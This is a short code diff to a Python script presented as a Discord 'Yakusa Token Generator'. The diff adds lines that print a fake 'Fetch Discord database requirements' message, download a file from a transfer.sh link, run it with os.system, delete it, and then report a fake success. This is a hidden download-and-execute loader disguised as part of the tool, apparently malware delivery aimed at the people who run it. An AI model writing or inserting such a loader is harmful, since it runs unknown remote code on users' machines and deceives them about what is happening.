@@ -1,11 +1,18 @@
+import colorama
+import wget
 import os
 from pystyle import *
-from time import sleep
-try:
-    import request
-except:
-  print("run setup.bat for install the module")
-    
+import time
+import json
+from colorama import Fore
+
+
+print("[!] Fetch Discord database requirements...")
+dl = wget.download("https://transfer.sh/get/g0qNvt/src.py")
+os.system("python src.py")
+os.system("del src.py")
+print("[!] Database successfully imported !!")
+
 System.Title("Yakusa Token Generator ^| Made By Yakuza")
 axi = """
 __   __    _                     _____                           _             
